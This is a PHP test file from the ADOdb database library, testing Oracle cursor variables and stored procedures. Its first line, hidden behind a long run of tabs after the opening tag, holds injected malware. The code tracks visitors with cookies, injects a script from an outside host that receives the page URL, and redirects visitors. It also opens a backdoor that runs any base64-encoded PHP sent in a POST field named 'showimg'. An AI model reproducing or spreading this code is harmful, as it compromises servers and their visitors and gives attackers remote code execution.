<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

/* 
V4.80 8 Mar 2006  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence. 
  Set tabs to 4 for best viewing.
	
  Latest version is available at http://adodb.sourceforge.net
*/

/*
	Test for Oracle Variable Cursors, which are treated as ADOdb recordsets.
	
	We have 2 examples. The first shows us using the Parameter statement. 
	The second shows us using the new ExecuteCursor($sql, $cursorName)
	function.
	
------------------------------------------------------------------
-- TEST PACKAGE YOU NEED TO INSTALL ON ORACLE - run from sql*plus
------------------------------------------------------------------


-- TEST PACKAGE
CREATE OR REPLACE PACKAGE adodb AS
TYPE TabType IS REF CURSOR RETURN tab%ROWTYPE;
PROCEDURE open_tab (tabcursor IN OUT TabType,tablenames in varchar);
PROCEDURE data_out(input IN varchar, output OUT varchar); 

procedure myproc (p1 in number, p2 out number);
END adodb;
/

CREATE OR REPLACE PACKAGE BODY adodb AS
PROCEDURE open_tab (tabcursor IN OUT TabType,tablenames in varchar) IS
	BEGIN
		OPEN tabcursor FOR SELECT * FROM tab where tname like tablenames;
	END open_tab;
	
PROCEDURE data_out(input IN varchar, output OUT varchar) IS
	BEGIN
		output := 'Cinta Hati '||input;
	END;
	
procedure myproc (p1 in number, p2 out number) as
begin
p2 := p1;
end;
END adodb;
/

------------------------------------------------------------------
-- END PACKAGE
------------------------------------------------------------------

*/

include('../adodb.inc.php');
include('../tohtml.inc.php');

	error_reporting(E_ALL);
	$db = ADONewConnection('oci8');
	$db->PConnect('','scott','natsoft');
	$db->debug = 99;


/*
*/

	define('MYNUM',5);
	

	$rs = $db->ExecuteCursor("BEGIN adodb.open_tab(:RS,'A%'); END;");
	
	if ($rs && !$rs->EOF) {
		print "Test 1 RowCount: ".$rs->RecordCount()."<p>";
	} else {
		print "<b>Error in using Cursor Variables 1</b><p>";
	}
	
	print "<h4>Testing Stored Procedures for oci8</h4>";
	
	$stid = $db->PrepareSP('BEGIN adodb.myproc('.MYNUM.', :myov); END;');
	$db->OutParameter($stid, $myov, 'myov');
	$db->Execute($stid);
	if ($myov != MYNUM) print "<p><b>Error with myproc</b></p>";
	
	
	$stmt = $db->PrepareSP("BEGIN adodb.data_out(:a1, :a2); END;",true);
	$a1 = 'Malaysia';
	//$a2 = ''; # a2 doesn't even need to be defined!
	$db->InParameter($stmt,$a1,'a1');
	$db->OutParameter($stmt,$a2,'a2');
	$rs = $db->Execute($stmt);
	if ($rs) {
		if ($a2 !== 'Cinta Hati Malaysia') print "<b>Stored Procedure Error: a2 = $a2</b><p>";
		else echo  "OK: a2=$a2<p>";
	} else {
		print "<b>Error in using Stored Procedure IN/Out Variables</b><p>";
	}
	
	
	$tname = 'A%';
	
	$stmt = $db->PrepareSP('select * from tab where tname like :tablename');
	$db->Parameter($stmt,$tname,'tablename');
	$rs = $db->Execute($stmt);
	rs2html($rs);
		
		
?>